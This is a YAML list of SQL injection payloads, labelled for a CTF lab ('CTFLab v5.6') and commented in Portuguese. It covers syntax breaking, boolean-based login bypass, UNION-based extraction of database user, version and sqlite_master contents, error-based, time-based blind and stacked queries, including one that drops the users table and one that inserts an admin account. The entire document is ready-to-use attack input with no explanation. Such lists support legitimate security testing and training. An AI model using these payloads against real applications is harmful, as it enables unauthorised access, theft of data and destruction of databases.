# SQLi payloads — CTFLab v5.6
# Ordenados: sintaxe simples -> boolean-based -> union-based -> error-based -> time-based -> stacked
payloads:
  # ── quebra de sintaxe ────────────────────────────────────────────────
  - "'"
  - "\""
  - "''"
  - "'))"
  # ── boolean-based ────────────────────────────────────────────────────
  - "' OR 1=1--"
  - "' OR '1'='1'--"
  - "' OR 1=1#"
  - "' OR 1=1/*"
  - "') OR ('1'='1"
  - "\" OR 1=1--"
  - "admin'--"
  - "admin' --"
  - "' OR 'x'='x"
  - "1 OR 1=1"
  - "1' OR '1'='1"
  # ── ORDER BY (detecção de colunas) ───────────────────────────────────
  - "1' ORDER BY 1--"
  - "1' ORDER BY 2--"
  - "1' ORDER BY 3--"
  - "1' ORDER BY 4--"
  # ── UNION-based ──────────────────────────────────────────────────────
  - "' UNION SELECT NULL--"
  - "' UNION SELECT NULL,NULL--"
  - "1' UNION SELECT NULL,NULL--"
  - "1' UNION SELECT NULL,NULL,NULL--"
  - "' UNION SELECT 1,2,3--"
  - "' UNION SELECT 1,user(),3--"
  - "' UNION SELECT 1,database(),3--"
  - "' UNION SELECT 1,version(),3--"
  - "' UNION ALL SELECT NULL,NULL,NULL--"
  # ── error-based (MySQL / SQLite) ─────────────────────────────────────
  - "' AND extractvalue(1,concat(0x7e,user()))--"
  - "' AND updatexml(1,concat(0x7e,user()),1)--"
  - "' AND (SELECT 1 FROM(SELECT COUNT(*),concat(user(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
  # ── time-based blind ────────────────────────────────────────────────
  - "' AND SLEEP(3)--"
  - "'; WAITFOR DELAY '0:0:3'--"
  - "' AND pg_sleep(3)--"
  - "1; SELECT pg_sleep(3)--"
  # ── stacked queries ──────────────────────────────────────────────────
  - "'; DROP TABLE users--"
  - "'; INSERT INTO users VALUES('hacker','hacker','admin')--"
  # ── SQLite-specific ──────────────────────────────────────────────────
  - "' UNION SELECT sql FROM sqlite_master--"
  - "' UNION SELECT name FROM sqlite_master WHERE type='table'--"
